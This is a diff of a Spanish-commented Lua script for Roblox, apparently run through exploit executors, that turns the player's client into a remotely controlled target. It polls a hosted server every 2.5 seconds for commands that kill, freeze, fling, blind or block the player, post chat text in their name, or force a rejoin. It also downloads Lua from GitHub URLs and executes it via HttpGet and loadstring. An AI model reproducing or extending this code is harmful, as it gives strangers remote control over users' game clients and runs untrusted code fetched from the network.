@@ -1,9 +1,14 @@
 --[[
-    Troller Script - MODO CLIENTE (Todas las acciones completas)
+    Troller Commands Script (MODO NUBE - Delta / Xeno)
+    Sistema distribuido por la nube de Bot-Hosting manteniendo la jerarquía original.
 ]]
 
-if _G.__TrollerClientRunning then return end
-_G.__TrollerClientRunning = true
+-- ================== GUARD ==================
+if _G.__TrollerRunning then
+    warn("[Troller] El script ya está en ejecución. Abortando duplicado.")
+    return
+end
+_G.__TrollerRunning = true
 
 local Players           = game:GetService("Players")
 local HttpService       = game:GetService("HttpService")
@@ -17,47 +22,143 @@ local CoreGui           = game:GetService("CoreGui")
 local LocalPlayer = Players.LocalPlayer
 local PREFIX = "."
 local NO_TARGET = "@@NONE@@"
+
+-- Tu URL de Bot-Hosting
 local SERVER_URL = "https://sbxx2o7cud.apps.bot-hosting.cloud"
+
+-- ================== CONFIG ==================
+local MASTERS_URL = "https://raw.githubusercontent.com/brsfjgh/prove/refs/heads/main/master.lua"
+local ADMINS_URL  = "https://raw.githubusercontent.com/brsfjgh/prove/refs/heads/main/admin.lua"
+
+local function loadListFromUrl(url)
+    local ok, result = pcall(function()
+        local source = game:HttpGet(url)
+        local chunk = loadstring(source)
+        if not chunk then error("No se pudo cargar el chunk") end
+        return chunk()
+    end)
+
+    if not ok or type(result) ~= "table" then
+        warn("[Troller] No se pudo cargar la lista desde: " .. url)
+        return {}
+    end
+
+    return result
+end
+
+local MASTERS = loadListFromUrl(MASTERS_URL)
+local ADMINS  = loadListFromUrl(ADMINS_URL)
+
+print("[Troller] Masters cargados: " .. #MASTERS)
+print("[Troller] Admins cargados: "  .. #ADMINS)
+-- ============================================
 
 local selfFrozen  = false
 local selfBlinded = false
 local selfBlocked = false
+
 _G.TrollerSelfBlocked = false
 
-local UNDO_REQUIRES_NICK = { unfr = true, unblind = true, unblock = true }
-local TEXT_COMMANDS = { say = true }
+local UNDO_COMMANDS = {
+    unfr    = true,
+    unblind = true,
+    unblock = true,
+}
+
+local UNDO_REQUIRES_NICK = {
+    unfr    = true,
+    unblind = true,
+    unblock = true,
+}
+
+local STRICT_LOWER_COMMANDS = {
+    kick = true,
+    ban  = true,
+}
+
+local TEXT_COMMANDS = {
+    say = true,
+}
+
+-- ================== NIVELES ==================
+
+local function getLevel(plr)
+    if not plr then return 1 end
+
+    for _, m in ipairs(MASTERS) do
+        if type(m) == "number" and plr.UserId == m then return 3 end
+        if type(m) == "string" then
+            local ml = m:lower()
+            if plr.Name:lower() == ml or plr.DisplayName:lower() == ml then
+                return 3
+            end
+        end
+    end
+
+    for _, a in ipairs(ADMINS) do
+        if type(a) == "number" and plr.UserId == a then return 2 end
+        if type(a) == "string" then
+            local al = a:lower()
+            if plr.Name:lower() == al or plr.DisplayName:lower() == al then
+                return 2
+            end
+        end
+    end
+
+    return 1
+end
+
+-- ================== HELPERS ==================
 
 local function getPlayersByName(name)
     local lower = name:lower()
-    local exact, prefix = {}, {}
+    local exact = {}
+    local prefix = {}
+
     for _, p in ipairs(Players:GetPlayers()) do
-        local pn, dn = p.Name:lower(), p.DisplayName:lower()
+        local pn = p.Name:lower()
+        local dn = p.DisplayName:lower()
+
         if pn == lower or dn == lower then
             table.insert(exact, p)
         elseif pn:sub(1, #lower) == lower or dn:sub(1, #lower) == lower then
             table.insert(prefix, p)
         end
     end
+
     if #exact > 0 then return exact end
     return prefix
 end
 
 local function splitArgs(msg)
     local args = {}
-    for word in msg:gmatch("%S+") do table.insert(args, word) end
+    for word in msg:gmatch("%S+") do
+        table.insert(args, word)
+    end
     return args
 end
 
 local function parseTargetForCmd(args, cmdName)
     if not args[2] then return nil, 2 end
+
     local second = args[2]
+
     if second:sub(-1) == "." and #second > 1 then
         local name = second:sub(1, -2)
-        if #getPlayersByName(name) > 0 then return name, 3 end
+        if #getPlayersByName(name) > 0 then
+            return name, 3
+        end
         return NO_TARGET, 2
     end
-    if TEXT_COMMANDS[cmdName] then return nil, 2 end
-    if #getPlayersByName(second) > 0 then return second, 3 end
+
+    if TEXT_COMMANDS[cmdName] then
+        return nil, 2
+    end
+
+    if #getPlayersByName(second) > 0 then
+        return second, 3
+    end
+
     return NO_TARGET, 2
 end
 
@@ -71,20 +172,15 @@ local function getLocalHRP()
     return char and char:FindFirstChild("HumanoidRootPart")
 end
 
--- ================== ACCIONES COMPLETAS ==================
-
-local function killSelf()
-    local hum = getLocalHumanoid()
-    if hum then hum.Health = 0 end
-end
+-- ================== ACCIONES LOCALES ==================
 
 local function freezeSelf()
     selfFrozen = true
     local hum = getLocalHumanoid()
     if hum then
-        hum.WalkSpeed = 0
-        hum.JumpPower = 0
-        hum.JumpHeight = 0
+        hum.WalkSpeed      = 0
+        hum.JumpPower      = 0
+        hum.JumpHeight     = 0
         hum.PlatformStand = true
     end
 end
@@ -93,17 +189,25 @@ local function unfreezeSelf()
     selfFrozen = false
     local hum = getLocalHumanoid()
     if hum then
-        hum.WalkSpeed = 16
-        hum.JumpPower = 50
-        hum.JumpHeight = 7.2
+        hum.WalkSpeed      = 16
+        hum.JumpPower      = 50
+        hum.JumpHeight     = 7.2
         hum.PlatformStand = false
     end
+end
+
+local function killSelf()
+    local hum = getLocalHumanoid()
+    if hum then hum.Health = 0 end
 end
 
 local function flingSelf()
     pcall(function()
         local remote = ReplicatedStorage:WaitForChild("Events"):WaitForChild("RagdollState")
-        local args = { Vector3.new(541.3642578125, 1002.5345458984375, -802.6290893554688), 5 }
+        local args = {
+            Vector3.new(541.3642578125, 1002.5345458984375, -802.6290893554688),
+            5,
+        }
         for i = 1, 2 do
             firesignal(remote.OnClientEvent, table.unpack(args))
             task.wait(0.05)
@@ -114,6 +218,7 @@ end
 local function flingSelf2()
     local hrp = getLocalHRP()
     if not hrp then return end
+
     hrp.CFrame = hrp.CFrame + Vector3.new(0, 7.5, 0)
 
     local bv = Instance.new("BodyVelocity")
@@ -132,6 +237,7 @@ end
 local function blindSelf()
     if selfBlinded then return end
     selfBlinded = true
+
     local guiParent = CoreGui or LocalPlayer:FindFirstChildOfClass("PlayerGui")
     if not guiParent then return end
 
@@ -144,7 +250,6 @@ local function blindSelf()
     local blackFrame = Instance.new("Frame")
     blackFrame.Size = UDim2.new(1, 0, 1, 0)
     blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-    blackFrame.BorderSizePixel = 0
     blackFrame.Parent = blackScreenGui
 
     blackScreenGui.Parent = guiParent
@@ -166,6 +271,7 @@ local function blockSelf()
     if selfBlocked then return end
     selfBlocked = true
     _G.TrollerSelfBlocked = true
+
     local guiParent = CoreGui or LocalPlayer:FindFirstChildOfClass("PlayerGui")
     if not guiParent then return end
 
@@ -197,17 +303,40 @@ local function unblockSelf()
     end
 end
 
+local function bringSelfTo(targetPlayer)
+    local myHRP = getLocalHRP()
+    if not myHRP or not targetPlayer then return end
+    local targetChar = targetPlayer.Character
+    local targetHRP  = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
+    if targetHRP then
+        myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, -3)
+    end
+end
+
+local function teleportSelfTo(targetPlayer)
+    local myHRP = getLocalHRP()
+    if not myHRP or not targetPlayer then return end
+    local targetChar = targetPlayer.Character
+    local targetHRP  = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
+    if targetHRP then
+        myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, 0, 3)
+    end
+end
+
 local function rejoinSelf()
     pcall(function()
         TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
     end)
 end
 
-local function applyCommandLocally(cmdName, text)
-    print("[Troller Client] Ejecutando acción local:", cmdName)
+-- ================== APLICAR COMANDO LOCALMENTE ==================
+
+local function applyCommandLocally(cmdName, senderPlr, text)
     if cmdName == "say" then
         if text and text ~= "" then
-            pcall(function() TextChatService.TextChannels.RBXGeneral:SendAsync(text) end)
+            pcall(function()
+                TextChatService.TextChannels.RBXGeneral:SendAsync(text)
+            end)
         end
     elseif cmdName == "kill"    then killSelf()
     elseif cmdName == "fr"      then freezeSelf()
@@ -216,6 +345,7 @@ local function applyCommandLocally(cmdName, text)
     elseif cmdName == "fling2"  then flingSelf2()
     elseif cmdName == "blind"   then blindSelf()
     elseif cmdName == "unblind" then unblindSelf()
+    elseif cmdName == "b"       then bringSelfTo(senderPlr)
     elseif cmdName == "block"   then blockSelf()
     elseif cmdName == "unblock" then unblockSelf()
     elseif cmdName == "rj"      then rejoinSelf()
@@ -224,7 +354,7 @@ local function applyCommandLocally(cmdName, text)
     end
 end
 
--- ================== PROCESADOR DE NUBE ==================
+-- ================== PROCESADOR DE COMANDOS DESDE LA NUBE ==================
 
 local function processCloudCommand(message)
     if not message or message == "" then return end
@@ -241,22 +371,29 @@ local function processCloudCommand(message)
     if UNDO_REQUIRES_NICK[cmdName] and not targetName then return end
 
     local text = ""
-    if #args >= restStart then text = table.concat(args, " ", restStart) end
+    if #args >= restStart then
+        text = table.concat(args, " ", restStart)
+    end
 
     local iAmTarget = false
     if not targetName then
-        iAmTarget = true -- Si no lleva objetivo, afecta a todos
+        iAmTarget = true
     else
         for _, p in ipairs(getPlayersByName(targetName)) do
-            if p == LocalPlayer then iAmTarget = true; break end
+            if p == LocalPlayer then
+                iAmTarget = true
+                break
+            end
         end
     end
-
     if not iAmTarget then return end
-    applyCommandLocally(cmdName, text)
+
+    -- Como el comando viene validado desde el panel Master/Admin en la nube, se ejecuta localmente
+    applyCommandLocally(cmdName, nil, text)
 end
 
--- Bucle de consulta en la nube
+-- ================== POLLING CONSTANTE DE LA NUBE ==================
+
 local lastFetchedCommand = ""
 
 task.spawn(function()
@@ -266,7 +403,9 @@ task.spawn(function()
         end)
 
         if success then
-            local suc, data = pcall(function() return HttpService:JSONDecode(response) end)
+            local suc, data = pcall(function()
+                return HttpService:JSONDecode(response)
+            end)
             if suc and data and data.command then
                 if data.command ~= "" and data.command ~= lastFetchedCommand then
                     lastFetchedCommand = data.command
@@ -276,15 +415,26 @@ task.spawn(function()
                 end
             end
         end
-        task.wait(2.5)
+
+        task.wait(2.5) -- Consulta la nube cada 2.5 segundos
     end
 end)
 
--- Reaplicar estados al respawnear
+-- ================== REAPLICAR AL RESPAWNEAR ==================
+
 LocalPlayer.CharacterAdded:Connect(function()
-    if selfFrozen then task.wait(0.25); freezeSelf() end
-    if selfBlinded then task.wait(0.6); blindSelf() end
-    if selfBlocked then task.wait(0.6); blockSelf() end
+    if selfFrozen then
+        task.wait(0.25)
+        freezeSelf()
+    end
+    if selfBlinded then
+        task.wait(0.6)
+        blindSelf()
+    end
+    if selfBlocked then
+        task.wait(0.6)
+        blockSelf()
+    end
 end)
 
-print("[Troller] Cliente cargado con todas las acciones y conectado a la nube.")
+print("[Troller Cloud] Sistema distribuido por nube iniciado correctamente.")
